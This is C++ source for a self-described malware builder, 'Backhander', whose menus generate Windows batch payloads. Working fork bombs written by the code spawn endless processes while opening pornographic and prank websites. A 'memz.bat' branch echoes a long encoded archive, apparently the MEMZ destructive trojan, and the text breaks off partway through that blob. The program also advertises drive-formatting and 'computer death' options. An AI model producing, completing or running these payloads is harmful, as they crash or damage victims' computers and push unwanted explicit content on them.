// __________                __   .__                       .___            
// \______   \_____    ____ |  | _|  |__ _____    ____    __| _/___________ 
//  |    |  _/\__  \ _/ ___\|  |/ /  |  \\__  \  /    \  / __ |/ __ \_  __ \
//  |    |   \ / __ \\  \___|    <|   Y  \/ __ \|   |  \/ /_/ \  ___/|  | \/
//  |______  /(____  /\___  >__|_ \___|  (____  /___|  /\____ |\___  >__|   
//         \/      \/     \/     \/    \/     \/     \/      \/    \/       
//  
//  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
// 	
//   Welcome to The backhander program for windows v0.5(BETA) By Adm1n_0v3rride. This program is designed to create 
//	 Custmized and generated malware based on the users request. More updates soon. Ciao ^_^ 
//
//	P.S This is just the beta verison 

#include <iostream>
#include <cstdlib>
#include <cstdio>
#include <fstream>

using namespace std;

int main() {
	
	int a; // To select the target operating system.
	int b; // To select the type of virus you want to create. 
	int c; 
	int d;
	int e;
	
	cout << "Welcome to the Backhander program v0.5(BETA)\n" << endl;
	
	cout << "Please select the target operating system\n" << endl;
	
	cout << "1. Windows\n" << endl;
	
	cout << "2. Linux\n" << endl;
	
	cout << "3. Mac\n" << endl;
	
	cout << "Please, Choose the correct OS you are targeting:\t\n" << endl;
	cin>>a;
	
	system("PAUSE");
	
	if(a == 1) {
		
		cout << "Please select the kind of virus you want to create\n" << endl;
		
		cout << "1. Fork bomb\n" << endl;
		
		cout << "2. Drive formatting bomb\n"<< endl;
		
		cout << "3. Computer death virus\n" << endl;
		
		cout << "What type of virus do you want to create?: \n" << endl;
		cin>>b;
	
		system("PAUSE");
		
		if(b == 1) {
			
			cout << "Please select the kind of fork bomb you want\n" << endl;
			
			cout << "1. Command Prompt Fork bomb\n" << endl;
			
			cout << "2. Pornhub Fork bomb\n"  << endl;
			
			cout << "3. Xvideos Fork bomb\n" << endl;
			 
			cout << "4. Porn overload Fork bomb\n" << endl;
			
			cout << "5. You-are-an-idiot Fork bomb\n" << endl;
			
			cout << "6. Memz Fork bomb\n" << endl;
			
			cout << "Please select an option: " << endl;
			cin>>e;
			
			if(e == 1) {
				
				ofstream as;
				as.open("Cmdforkbomb.bat");
				as << "@echo off\n";
				as << ":begin\n";
				as << "%0|%0\n";
				as << "echo HACKED\n";
				as << "goto begin\n";
				as.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(e == 2) {
				
				ofstream ph;
				ph.open("Pornhubforkbomb.bat");
				ph << "@echo off\n";
				ph << ":fork\n";
				ph << "%0|%0\n";
				ph << "start www.pornhub.com\n";
				ph << "goto fork\n";
				ph.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(e == 3) {
				
				ofstream pp;
				pp.open("Xvideosforkbomb.bat");
				pp << "@echo off\n";
				pp << ":fo\n";
				pp << "%0|%0\n";
				pp << "start www.Xvideos.com\n";
				pp << "goto fo\n";
				pp.close();
				 
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(e == 4) {
				
				ofstream sd;
				sd.open("Pornoverload.bat");
				sd << "@echo off\n";
				sd << ":no\n";
				sd << "%0|%0\n";
				sd << "start www.Pornhub.com\n";
				sd << "start www.Xvideos.com\n";
				sd << "start www.xpee.com\n";
				sd << "start www.wikifeet.com\n";
				sd << "start www.camsoda.com\n";
				sd << "start www.xhamster.com\n";
				sd << "start www.youjizz.com\n";
				sd << "start www.chaturbate.com\n";
				sd << "start www.buttnakednasty.com\n";
				sd << "goto no\n";
				sd.close();
				
				cout << "Payload Created.\n" << endl;
				
			}
			
			if(e == 5) {
				
				ofstream ids;
				ids.open("youareanidiotforkbomb.bat");
				ids << "@echo off\n";
				ids << ":adm\n";
				ids << "%0|%0\n";
				ids << "start www.youareanidiot.org\n";
				ids.close();
				
				cout << "Payload Created.\n" << endl;

			}
			
			if(e == 6) { 
			
				ofstream ads;
				ads.open("memz.bat");
				ads << "@echo off\n";
				ads << "echo UEsDBBQAAAAIAHV36kiQ6IfZcyEAAAA6AAAIAAAATUVNWi5leGXtew10U8e17kg6soUtjACbGGzi>x\n";
				ads << "echo AxgMyD9Hlm1sY4JkW2AH/wjLP5BgB9k6RhKSjqIfbKcJyBgaqw65tM1NIJckNE1705Tcpi3JJWma>>x\n";
				ads << "echo OD830Da0TptFSQOpXx7NFSnhmYRbnIRw3jfnyMZpfmCt99b7WauzvM+c2TOz95699+zZIw71t+wl>>x\n";
				ads << "echo KkIIAxBFQo4QuZjItctJQErWcynk8LTjC44o6o4vaHa6gqw/IGwJ2L1sl93nE0JsJ88Gwj7W5WOr>>x\n";
				ads << "echo G22sV3Dw+dOnJ2XHaTxj9pZ/yKpcE/Dphr2uz6R3pet3qDdvT3BekurLro+kWuGkdZOry0nHf5Vs>>x\n";
				ads << "echo VgshdQo1eXHNzrYJ3ChRKpIVKYRo0Vgu4/Jm4aEDsPFV03clIWqikPonahKJK0nqNu2WBtKxk/Vk>>x\n";
				ads << "echo JZXDKwk5SF82ExJTfImAfogBPnvLCSm9Dl1PFsip+zJ68ZIf4ntDdHnJcYG0V+WeQmJzfsBhD9kJ>>x\n";
				ads << "echo eXmBjCAL/24BRNKGKV8eRu6jPK1E0g0p/MK44fxAMNBF4mvdHB9X9CX0ArxH6JLXTnUgyVbyhXGV>>x\n";
				ads << "echo X73Cf5T/naVl6NzAXVpdaDqec0KJ7eLiU6yJxBLQZRxuf1lHWtvcqR1Gsa2tzXlFZyJO6iRtYpoD>>x\n";
				ads << "echo o9wOMc2EeuC8Ivzn2zrOTtA7l2lrbXPuKjMRMa0I/UPFEfocd94DVJt4wnmQ1kMnxRNGcWhs99uh>>x\n";
				ads << "echo hbv/Frpxj0W0trkV7tniH/ZYLlrdCZQlvHJYPDHw6tI9lnGre6mY5gElq5hGUO2xxKzOwxLJNA3a>>x\n";
				ads << "echo GL/Hcuao5Yzkqm1iePyoZYy6mZjGoNuZiK3sThDTRtG4rePWob+0v9Iqpm2mBN3E+cZcLEgNygsw>>x\n";
				ads << "echo VIdFOitWQOixWME0qOL3l4pHlmM9Rf98zIpxIPk65mH6MVTG4Y6XGbry/nMV4GdrNb7dFm2/+Au6>>x\n";
				ads << "echo B2xuk5jWi0E2a9QyFpc/9gRoOmMqKhpVoJu4lbFdwA2NH9396meimIuZe6Q3a1vsdtrRPmb8m/j0>>x\n";
				ads << "echo 68BAVrppxDQ/XRTl4TZFLZdlLlLbKoYvRy3jsWpMhBZsYlouunYPhxVr0COmLUULeDEtRLU4wUaH>>x\n";
				ads << "echo 0RjzYJs8YGX44l3q2BX0RcMX3Ulnm0RRlIzrsLUOFY/QZb/dZhNPuBXf37Ue9E58f3A9tcllWKdC>>x\n";
				ads << "echo NtJe6ht3XVbMuPcvMIkzG/oU/YyYxknSzNg9CNvYbDbnzTOhHpvsU3ssjx+1PM6h54VSjD9qeYrA>>x\n";
				ads << "echo 66zR8Ei0/VC0/XC0/Ui0/flo+3C0/dVo+7Fo++vR9jfFtJNUwyhuh9tB61aQe1Nyvct4/jV1j+Uk>>x\n";
				ads << "echo BIpJDOjbGXm81Dixe3jHnzFVhT8nGA87HZLr3knnn4y2jw98KoY1bqWY5pQ0TN0oblTqv2WrYstM>>x\n";
				ads << "echo ZFv6c+nwnKHf6k98i0laO6gwr5TwgQvGX5VNP0dHzPlWf81CExnclXIF6jCvlLCB992EurtEttU2>>x\n";
				ads << "echo ND+bGucPMATjVv31HphpaJVkrz/C7hFI51bCW+Jy9l6Vc2zgihhOdDNnW0XqIpSkWPw6XNY5tow6>>x\n";
				ads << "echo KqWY6FafXYHuVhBLMr5tk+Y7TxXK2t8HMmXzTwE19OnQfOqW25a+wFHTbmPEPxiHrdZWp34ebGGV>>x\n";
				ads << "echo LbV24DXNylV0fOC0U5cDV/vDXy8NFdN98SLdOu6iNmcNavjIwHiCbG2KGy2dwIV7nTTWTyjTSc+h>>x\n";
				ads << "echo oTFqulK6KdS3uZNskte0Uvnuo970PxTh9/dYDhy1HKigmzwaPgQP2VBGHeUgSJFo+2PR9sclP3n+>>x\n";
				ads << "echo qOVIkrT7D1DiVHdiGK5STU1/tuCK5M7r17uToE8Sq1XLu1y3QNrlBLvcOVomb3WqmdhSDNj/7DFQ>>x\n";
				ads << "echo ufRxtOXy25bLp9vHT1vG37Zo5JdTxRvKTeSUmqPPVRHp3YnnOy/FDmIuDTcSQ8RGGszEtKeo3Sza>>x\n";
				ads << "echo Z/dpQPnSx3v8ytgrDH29MvRJ7Nn424exn+DNrdp/66VPb57xkz+qWi43xQ5InbR9QtUy3iSmHaL6>>x\n";
				ads << "echo Um6IRzVpm+pasZEPS3EXL+ckH9ljGUNcTHtMYnzZ+Cu95aJTQ4xk/fpW65BlXI9uvIpp6TS2YeCr>>x\n";
				ads << "echo UpAH2UnhqRtYnffNjR8EcVeIJVMZb9y/8atUM33pFNUMSu+bZdXsZmTVwLsr5lJvPizHjiOUdeGG>>x\n";
				ads << "echo V3AgkNghlWycVNk4R6x0oAaN2HfQ406ljPcwM+WFZ9smV37SFm0fkxePCLnHcspqk1cfuwXzhurP>>x\n";
				ads << "echo DLx0YD+V+WKsVkLEJhDjsdKpI4b+FFs6dQAMlK6i/rBBSf0BVpo2pelkyeukzTbUftnW1EoDbfii>>x\n";
				ads << "echo TVaqTQyPyWqVdHPutOXcqeKaKbrxS++leMa2guJUg2bGT7bYwzTkL98IMdyZOPAGXuasbkV3tCUm>>x\n";
				ads << "echo pl2ka9uupKLsVVBR9uzMVUz63sC59C91ithVp7g4VD8miW9dT7dF68DwAese8wGru9BdCMfInOIY>>x\n";
				ads << "echo Uxz/iysw0RX8SElXMMk8deLgaHMniyf2618eGndr3xDl17E3rsRtL51lkmgnpSgm7ROnYgeR9uIw>>x\n";
				ads << "echo HUJ99TU8L+qPDq0aoxib+MfYN7FSCDU0NqHYXgjxVuzUS6fVVupsH8Ld5kCkoWNDr0F5u38fXu5U>>x\n";
				ads << "echo gWxTnGrMoqDbahU9x5pipXKDnm1NoG6TTs5X/36ftU5GsGb5HHe4lQhhUihzT8exIaaNS6ddKKM1>>x\n";
				ads << "echo xoHkRnlMKyrtZDc0u0HKI0wd7S9ryFdlJRzNSmI0Zo9JkWkIvvT4l6QhA3dpVG1Dd+nCZbahrEtV>>x\n";
				ads << "echo EMUUCeW2xnh4z9B0uiL9utT9kts2SahBCaWjnh/MjNrSO25F9kTFoxp/nqZL7S9rKWWkNn9rG3pn>>x\n";
				ads << "echo 6MrQaw04ULRDFg1yAN3GjUNjVe6ktXI289d3aaj43j3rpZxjsRMKGnMrEDYoRkzTyrmIxq2QD1Rp>>x\n";
				ads << "echo 4J76y+vdDIytk2PTYhxTOyaiTutQWIM1bqIHwLhiu9X4+xpb29A4HGXoT7vF7XO7h5jtM/5d29Ed>>x\n";
				ads << "echo ZTqquqPa7Y0r/3zn+6Cye3j7AnfSbe7pG7vLKlrDuu6yulZleBqGtHZH72xVVq4cufMvt90quejb>>x\n";
				ads << "echo m7IvD1VnX35FXFxDz9vFddLTKj0HWdP/iWT8/0I5bCLkGGAUMA7QmWX8d/B+wCS/n19FyCcAzU2E>>x\n";
				ads << "echo pAJYAAdYA3gP+G7UdwDuBzwOeA5wDHACMIL+YcDPAA8D9gJ2AbYBNqDfsUrmcSDO14raBOAA3XGc>>x\n";
				ads << "echo EnLMAlAjcAAToBlAPesOwN9WE/IYYCfAB9gEqAGUAJYAZgGugFcM9SnACOA5wBhwe1fLPHbFeeUD>>x\n";
				ads << "echo 6O8hvxhNvPeVe98+wiifVZJnyC8IOT7bMBx9JfpS9OUXCHmRmA71X3k4MVhcEQmqzupI9o7Blw49>>x\n";
				ads << "echo ceVXkY/F8KWz74qDrx6KvnIo+mH0nf7XiGmij4QvRU+cfVV86pn3qo6odD8nx3UvQpbhh54lR+59>>x\n";
				ads << "echo 6Qghz44kfvTjFw48AuwZu1b1nv3niqbD33wWY8jm42m39F+JPXIXc+jw2I+v/CbyKQn/99boiSej>>x\n";
				ads << "echo L0XOZL1XOTj6XuXwB+rhvygH/xr9sKP/k4sPhV95gZhA6ggWc/IIWAxf+c1Zljx16olDT/RfGX4o>>x\n";
				ads << "echo VNkvHpwRUp09J1IuijgXzOj/5MAjYdVzFx+S+Rz/Ih+Jydmfi+Bw9iWRtDwxMBNFus9rpF8SWFKc>>x\n";
				ads << "echo PHDhwswLhKwj9zMRkTQ2kkcayfu2nVkXshSVDaTBqpyVNaBDUVoZpVUT0SkNWQOpKMoIM1CNohxk>>x\n";
				ads << "echo lJGUu00p589/gKJ8lFH+QL3z/PkU5eYblYOagTUoypOMciTlHnL+g9OnTqMcx5/yI2bg9AfnifLn>>x\n";
				ads << "echo 8we6UVQso2I1qoUp/eS88lO1yswMjCQmjig/ZnadJ7rEROXP5g34UFR+ZuA8iqqXUfk1u0liIhk9>>x\n";
				ads << "echo r7pJ808gSnp6ehJHRkZGE/GiUs5T9WoG3kdRHWNUw5rdScTfk0hU96qVnzD9p0ZUjzKRHtX7jOo8>>x\n";
				ads << "echo o2qZN/AECqNjGJ2GmZNEx/ohyMeJqn3qyBhTykT8zEq16odzB76PwmxmBowojJNhNk8fUJHz7ygv>>x\n";
				ads << "echo MKr7E/t7/MxqhrmHYdbMY5yau8tQPgYwT2kfLOMg6fl35JLih6hy6fErVP86d2A/ipow/fsfUTMJ>>x\n";
				ads << "echo ajJtEG0syE8UqkFmQIGiXpCg1qtV6oyBb6OorYy6RqfexKhzGLVbrd6YqPYmKo7sI49cSNgfVB/6>>x\n";
				ads << "echo buKOhMQd63ZemJml/rGoeeIXSuvHqhq1qkEdmamyZar86bvOj0Ig1R6tap+mf5SoHp2vGk5nqpn+>>x\n";
				ads << "echo 0VHVO0mR06pYDjNz3oAfojL5ScyKpczmzIiKuSuZuXspMzyd+aUuUsb8Npk5maPWabUjWvUNGjWb>>x\n";
				ads << "echo rF6+WN2ZELmgbktT356oDsxU71yuflJM+KmY+PS/9c+cqfhOIzn1dMrlA2Rdc9LGtFmLk3bpUlBm>>x\n";
				ads << "echo mZhZJk1Sf1ZkZtKP0maFpw0QuJSWUUdOJT/NJB1XJ71h1io0O0+PjMzaz8z6HpNUkJFcq5utS0nu>>x\n";
				ads << "echo 0Mx6kImQZA+jakxIDmck75+RvG/G7Hz1rAfV2rZE7U/VyaFMRjdv58GDB1WnmdkDCZHjs6PqyA6t>>x\n";
				ads << "echo g5n9doLWmaXlZiYHGCZXPbswOdIz+9vqSGIqGrF0bTQttYUZVKEYIc87s95NjEzXOtT9fj+jh/9o>>x\n";
				ads << "echo n56nTknRnp65K3EUJXWYuRsVnMfvT32dOs1fMvovZM38nVptvSFCUt9kdirQU5qYNludNjsJepnx>>x\n";
				ads << "echo 7n/OeOu76kPinEUHb/gBo0mv16TeOosVZ2c92Z+YOPu3Nw8chIekZtbtUvn9KmOqtyj10cz+vYmp>>x\n";
				ads << "echo LxrUtfPTUsT0B0RN2n2pY4kgNidPZHfVJVlv7K82zdNxSQfZeZtv6R8ZWViqTl7ALLiQkWyam1Gb>>x\n";
				ads << "echo tLAoISMpsf/0+dR0RvVDQ/9ooirKJD+ZkPG9hIxblmTsSO9PSsp8lMl4KDnjRznaggUL30jOuJyt>>x\n";
				ads << "echo 3XFjhMu8KSmzNidTyIzsXZSekPndfLU1A0Lo3hqPXFhirScPr9154ULWkkcb4HMJo+KCZ/6gqlUv>>x\n";
				ads << "echo vFetshUnb0hZ9B8a1cPlyY8nL09Sq2Lm5I81i25PZipMi57XMfdwiy5nZt+g1v7bwkhWtml+pCe7>>x\n";
				ads << "echo Q/vNUTnmay8yy7QZ2XvZ3G+oc7eqs388g5SKeXN35IoNOSv2LXnoQSx+8X/dkiWYklhu7tiNEV2S>>x\n";
				ads << "echo YJhnYpVjkXmj6dMVTGTzvM+mqe5fnsGlR1JUb92dMZJuvFnN3GVMtc41/gvDHF/GfS9J+0aWOmvx>>x\n";
				ads << "echo jdHZuZvT1J4czSyRM36W+IKYN0/Mn/tdQ0lyZMxQ8UHy3Jx5o3P7N2+e92lycvfywoPpyY8PGk2Z>>x\n";
				ads << "echo 2roi4975EaP24azi0dnaEWt2dP70VfNnvCUmPC/OGBR1u8Qlzb9eMPzrec8tWfjUsoxpOctH0itv>>x\n";
				ads << "echo Tpi9fafen56aXqofnrtrGkpZ5k2Nqb80qq2Z2T9Ki1xIWyjOWS/eYBXT68WSO39vJqJZfDLjQFHl>>x\n";
				ads << "echo aHqEyzi7oopL3zXN759WVlVvzdxjrBqZX3VeS62Q/VzjmpY3blwpKm5dQZ1jmdjIReaO/Xrht5bM>>x\n";
				ads << "echo G1228K2ccv8Ni26IrtSxi4Y5496s7Bn96/ZnrPslU61Qm3YlrHu9psA6svrdh0z9TIFCpHv4E9Ea>>x\n";
				ads << "echo Obt8Y045u2T5D5eX+xct/+iupkiu0bMysropptPHcmxZcyIf36pkcpcX2wQIf6tFHbmQ+w2D5max>>x\n";
				ads << "echo be8Dm95obF/YePf2nFk5dWuOVLcPq+9dciS7KPvFRUXZZPGR6ro17cOa9jfVB4GLLnpxURT4ujUP>>x\n";
				ads << "echo WbbnbM/x147lOJf6l/ldzpqxte1XEu52Lt2eU7fkocUds5gOHdORwuz2L9u+tm5NxxztwBhmdCRp>>x\n";
				ads << "echo +sfWdqRoOtYwHRXqXTX+WmdN+8Xu3f7a/bll+o7hhI4nEgb8y2bltB9L6PfXdrym6d+f2/Em0/EM>>x\n";
				ads << "echo c/f+3E/zs/PRHE7peF1zG2E6/sZgLFl+mzah4/fafnJzx7DneWfNRiEcYLsErz8c4gOs0x5kO3ne>>x\n";
				ads << "echo bFVjvbWl2dLE1phtbKXF0sCuaalaZ6lmKzeyzTUWmWBzU+PN5ob86UnTkz4vRo/gywmxnYIQYsN+>>x\n";
				ads << "echo 1r7F7vLlTk8KCmw4yLOuEAspPYJvC637hDD9Z6AFlEh5NX02B/pc6AsJ7FaXxyNz6qFvXXY6vY9y>>x\n";
				ads << "echo CvYFQ7yXjunkpyc5+CDW1oflunzBkN0X8vTlsuDmkMQIBfooz/Jq7OM/AeYBnKGQv7ygYIsgbPHw>>x\n";
				ads << "echo +V1CftfWgiBvD3Q5V9++qhPk9D32Pn1I0FMR9JRlkPd0X2OeU+jRF+oDvFfYxuvt+m2uQDh4LV7e>>x\n";
				ads << "echo Lns3z+u3BfU+IRASfNcaT3lArCDvc0ywoG1vn7474ALymvxcPr4rYO8O6Z32Xr1D6PF5BLsDzCfF>>x\n";
				ads << "echo vS7+W/iQ3iv4+L5r6lLw3eHSd4Ydjr6r3LoDPH9duuwM9+l7eN5BrleuLsExqXq9y4eXYNju0Xfa>>x\n";
				ads << "echo g66uifvM19Lpcdqpavx+3gcC3dT0egfv4UO8XvY5Y+E1aWwxhvQB49bQNXVjD3U547JO6OZac6TR>>x\n";
				ads << "echo +XzvtfTn8mEf+mAlvtfvEQJ8QO+Cozh5veTcnQGhJ8gHrkMf3fYuHvt4K3TStRXbEkoWPJIBv+g8>>x\n";
				ads << "echo +h4hII0p5Awl17MO2NflcUA2D7/FFfo81eu0d4C3wzR0g+oxUR+w+4KCt8ceuB7/wvz4ZvXy3jv0>>x\n";
				ads << "echo cni8zn2ADTcR7ahmHQJddw/vCjigZbxDGaFu2iP7ElzR77kDDY//6+k67L6tkjjXJ/+kDeQp15hj>>x\n";
				ads << "echo 93TrPa5uXm/Ewj28PQh1Q33XmodVIAqGETrsIRdm2j3X9hsEh5B9C6/32wMCtr7XLjlG/N/9ZQf5>>x\n";
				ads << "echo 2vnUVSWrwJRxll87nob9rQgx0tNr78Nf8Hr2u1tw+vRdvM+u97ocrrgj+oQQrOvbxgdCiD3X8GMf>>x\n";
				ads << "echo H7SHuyRpeczyePiukIsG8q+Xd2sAOuV79cEuHDQCji04ErzP5wKpoD/gCvFBSaRJOvDsHj4QzPe6>>x\n";
				ads << "echo ugJCUOgOgaS3gPflhYMF0GsIbAu6hUDYO9G6TYASA3kTrSD92AJGKKBqzfPaPXSXSM6eJ3t+HnVo>>x\n";
				ads << "echo Guk8fXnxE5UOLywp7ewydBXmGcu6i/KKCrtL88o4NIvLVthLVhg7SzqLiqfq2Sux7RTsAUf+NqxG>>x\n";
				ads << "echo EhMWdBT00HiXh+0RnGCfFwoHfHn2vImtlIewJaDtcMEMdk+ek/d4ILefn0Lf77H35Xd5wp3YVlvC>>x\n";
				ads << "echo Lh+lP9nXJfhDLq/rDj6AZUs9k/OoygSoV8J22T3SeQBL834Emy6vg/RQpQMX4LfwDleITEROOi5k>>x\n";
				ads << "echo D271bgkQbxB+0e3aQnHeoB95TYg4+G3eLd5QPvoIeqE3D/F6u2gexa6rratD0lS/MZ4rIc2h2RdN>>x\n";
				ads << "echo erB8dosQz3QcLp7+rESaLLZmtraBtdbabLnsmsYmSytysHq08kkt22ZuagA1EEa6RmrMNWa2geMq>>x\n";
				ads << "echo 2bpCK7vW2Mw2Gdc1I38D8W67y4N0yB6S0yWD0biCdRb1csicaEZzB2VG5WtuqgVBWyPSvKZq1txQ>>x\n";
				ads << "echo za5tbKbtNeamXLayRRKG5nuWhupcVsoMrVWQw8bamrG0eFK4ALKgbsLqLA03N25kK7FSstbSjMyx>>x\n";
				ads << "echo WU4iN7ANlg3NbHNtvYXtrcb4Vgsmg3bTxtqGtWxzI0uXjvXKTKrNzWaasd25qeBOI33g1K20NVZD>>x\n";
				ads << "echo HGSmmAH5W2ubWmystcncsI5duraxwcK2NTU2rF1G9SiLQQVv2GhuYKvM0MtaPsTS+MAiQXRJjs96>>x\n";
				ads << "echo yxbI+qLGQCKM/SaEsAoo9gt/ZFG9fStfLzvuWnrumGleS4itsd5S2Vi9kW1sqLJgJXWwt+VqkmzG>>x\n";
				ads << "echo miBdg5ltaoTG6i0TeUibsw92d0jOwG+TcnYXbDY1710dT6yhc1eQ7Q53baVG9fUhOc0nNr4rHOAr>>x\n";
				ads << "echo aZIdRE+Q2nRLoJT1lrIuFnVpQSmpsW+TMuYJ2thu1OOQDgvd3aDkYAWfnJ+vJhW1PuQEIfZmgfew>>x\n";
				ads << "echo t4exM1hsZP4mKivWy4fosUbFs0O6tWaXmUUk6URIWhBfDzZrLku3rEDvHAE+n62Np+CdvMeFJbI9>>x\n";
				ads << "echo fA6e0gUF+9PPBzxIzemOcSCCOjA+x8tW0oyRksyRPhXDH2YG+qRTFQR7YD36pZi3b/K6kTM9ic2j>>x\n";
				ads << "echo phWErpCBlbMPzG9x5rJVCBSsNR4p2GaXl6crQPrKdiIc8o4FXz7ZJuV6NXaaUMvv68MIiVJcl9uW>>x\n";
				ads << "echo 3i6P3WuXUaSA9BA7CZEu4iQOIhAaIJBgE2rECXs34x5GgxD1H8km7nAwxCKV68IiHHShiB5BF/Ih>>x\n";
				ads << "echo tOIBEncrSQvxpnwPctoDXnlfT164qCVxxvJBatqwLxy0d3ro5NruyVgT5Hkp2Ejk+GAQpzPIhZxC>>x\n";
				ads << "echo OMRu9Qk9tJNmv18UDXcpF06GPtgM83B9lNghdEomiYtEs5yrDClBmVpoqvgOARLSybQRDtLpdjaI>>x\n";
				ads << "echo GxDuo9iRgs/Lw7owEE6/UG6c30Ze8jqc8HBOV0i6blY30jiBQNTQTGOHZYOlCrdVbLpaG1tvrkOg>>x\n";
				ads << "echo tOTSiNJS10zDC4IYokBLQ4vNXFmHfWmuqqltsMR/15cm4Y/u2Doz4i8Ns5glXUkpsqrJYkZoomMa>>x\n";
				ads << "echo EB1B1trYYKullBChQXkj4lW9eS0lXG1hW2xSRJsiCijJ4XJCztrm1dRnvPAZF6H+s2lT/iarsw+3>>x\n";
				ads << "echo FLunOuDaxnPA0cMpPyR9q+cLOTw062oKecwOahwrBiHEb8GB1RBqsruCfA0OXEsgIEjnlY3wACcJ>>x\n";
				ads << "echo wyepP/aAi5UEwG0bwIPeLYSedfTrB+xDKgKwAvFIc0PSGA9hMT8oSbgF7yHQc6HNwssFyO6XqPOg>>x\n";
				ads << "echo uppcLcPxxli81pjkWhevU+N1drzOj9dF8XpjvHbJtWmHXPsfiLcfkeqJbzanA84BjpUD4t9rTvSl>>x\n";
				ads << "echo kM+XtVXNdfRfHeh3j9I3kNlead0T30vmu+iHjNlSMqNDADoyF7j4N5CUPuUjt7PvuOMORyfd4/Qb>>x\n";
				ads << "echo znvI5FzpbmiqwCqv4oySj1V8jof01SP9d60OZhInf+FoJWQXHRf/pnLXevmTy/zOoJzObpY/nZS+>>x\n";
				ads << "echo pczmDBIKiEHFJE6Sobfi6rrfRQTPxhrHp+C+CS0+BpxnCu4J4NJZWdaJstAs6+fMFFwvcHuB27Tq>>x\n";
				ads << "echo Ku47wGmgs1NTxh0BbpAlX1r+8W+KMo+Jf1O0KJGdWANCl9nhoEGPkGpVnYBgYPZI38LWyK019IeT>>x\n";
				ads << "echo iKoRO5YOpgOHFZhZFQ4EEDkncHMVll7XZOtpUiXdkpudNAsn5D+mzJBxtcD+jLF5eN5PFqvbaB68>>x\n";
				ads << "echo BsGFNJEqj0Aji8+BllntwaWgy+uHzJUT79hpFZDN7qhzdQbsgT70pdK11ONI90hUGuxeHqPulrgK>>x\n";
				ads << "echo Xi+I1eHS1EYG43LRQWZyF2OjGnAJ4N5X5bFTHbwwIbkgeJBX+I2FNp/dH3QKCIn3q+LrMxaucQWC>>x\n";
				ads << "echo oTay7yqmAbsbPH+uXOsROieU+Fy8JSmRNEgr8PA+jEPq2mCpMxbmS0G2nUpaL5+QbeSyspn+qOCB>>x\n";
				ads << "echo GHEcIT8h1S4k/7jNTA4j/0WozttcPlzJg5ZecoBU891yk4qFEXXKJtwu6UVPWp6F7iNvfIXyQIra>>x\n";
				ads << "echo TrnLKUY9j6ytC3pIUcb5VAoY8TslNBVnVCMIWy29IK5q8Tnx/jk0+QZG+hzxuTT3wVnfRrZJ2Fof>>x\n";
				ads << "echo MgdylFQH7D21XTSJ+Q7lLBOoriI8pJV+IsD7gas9TbhKkrQp8rSRb1F54E9BIWAVIC0b96+J9iLa>>x\n";
				ads << "echo ruaDW0OCXyZCyJ+JxRf2VjldHkdcZEIySRUyS2q6uPjkAwX1LCpdG2mxWZomLDSbVLpClZ4QtbAt>>x\n";
				ads << "echo FOBhCKm1tro2PuSSYsoeaRa20hMui8hHp9ScPD+D5AFwEbaG/ZOoVrsnDJP+FLbp84fMXbeHXQG+>>x\n";
				ads << "echo Cjc72atekvFreV8TfJleMc3VrWbrBGtyo8JGk2CLnD2ZycLPtdtIApmyDZoFc2DLNlBd8LlR1Ka2>>x\n";
				ads << "echo GkvdhFNqiBXXXpsQ9jngNW21DfX1En42iccNLLPWC4tM7DiMstogVH51Xd2Xh+DrLm8uNxGt3kRM>>x\n";
				ads << "echo AD/gKcAYgM01kQ2AQcAIIDXPRCoAfsA+wCigFMd7L+AIYBxgLUAbcAhwBpCOwLoBMAgYpkHWgDmA>>x\n";
				ads << "echo CGBpIfCAxwDDgDcB9EvUM4AYYAwwDmCMkA+QDmABuYAiwMUS0FthIroV8oFSCpwHMAjYB3gKcBKQ>>x\n";
				ads << "echo jdSjFNAMuBMwCNgHOAw4BhgFaIpBG7ABsA9wCPA8IAZgwGcpoBdwBHAZKQ4Xxt5Ok+sf3IC5DYQc>>x\n";
				ads << "echo nIP1vwJ9xvHL58j47nTImIOzEm3TAULOYvzm9wk5jva+cjLxv0v+HykKko5nuvy/XT6Hp3JyX4Kf>>x\n";
				ads << "echo hhynhlzNU/6+VKzu9XpY3PGCuEutyjHkczm4DnQJDlwPVuW0NK/JK82h2b/PYfcIPn5VTh8fzFl9>>x\n";
				ads << "echo 0/SkCkRR3EBxMQEBX3BVDm635cEuJ++1B/MmfyajPy6V24Pe/G2GHFxEfK5u3C1ap3IDKZatCAUQ>>x\n";
				ads << "echo G2p93UKc2sJrUDMulOZhZpBexHFqxdvABPjb6XWRd1wNM5OdU7vl3Q5B6nDH9bAe+lyVQ7sRccwO>>x\n";
				ads << "echo r8uH8yJgDwmBHDbsMnfRbb4qp9vuCfI5bMFVfgVfzbCi4HPiVRRMrpNqsGBChWh8pcmRgG6A3WZx>>x\n";
				ads << "echo uVwpZ+Ju4TZz3ZyXC3NPcf/ODXNHufe4jziFYZphpiHDsNxgMJQZTAbe4Df0G35h+I3hPcNFw2eG>>x\n";
				ads << "echo tMIVhdWF6wpbCjcVbi0MFe4qvKfwXwofLTxa+Hbhfyv8oPBSYZoxw5hnLDdWG9cZNxm7jT7jncZv>>x\n";
				ads << "echo Gx8z/tL4ivG08V3jZ0ZlUVKRrii9KKsov6ikyFS0vqi1qKMoUHR30f1F3yt6oujVojNFHxbpim8o>>x\n";
				ads << "echo zizOLq4rbireUNxR/I3i14rfKf7P4ovFaSXzS4pLzCVbSrwlwZK+kqGSb5fsK3my5HDJcyUnS86U>>x\n";
				ads << "echo fFjiXhFaMbAiuuKfVvzzit+u+GjF5RXTSvNLS0otpetK15e2lfpL95Q+UPr90qdKXy49VfpeaULZ>>x\n";
				ads << "echo 7DK2LL+stqyzrL9ssOyBskfK/rXsp2XPlA2XHS37sExdvrC8sfyWck95oHx7+UD53vIfl6eunLeS>>x\n";
				ads << "echo XblkJc31D1P9cgyn4bScjkvl0rlMjuWyuaXQNccVQd8V0Hg1V8PVcVaumdvAbYL2HZyT83B+LsT1>>x\n";
				ads << "echo cndyEW4XN8jdw+3l7uP2cQe4g9xj3OPcIVjnMHeEex4WOsa9zo1wb3InuVPcKHeGi3HnuDHuIjfO>>x\n";
				ads << "echo XeaIgTFoDFqDzpBqSDdkGlhDtmGpIdfAGRCHDTUGq2GDYbPBCWv2Gv4XwsY/yv+35X8CUEsBAhQA>>x\n";
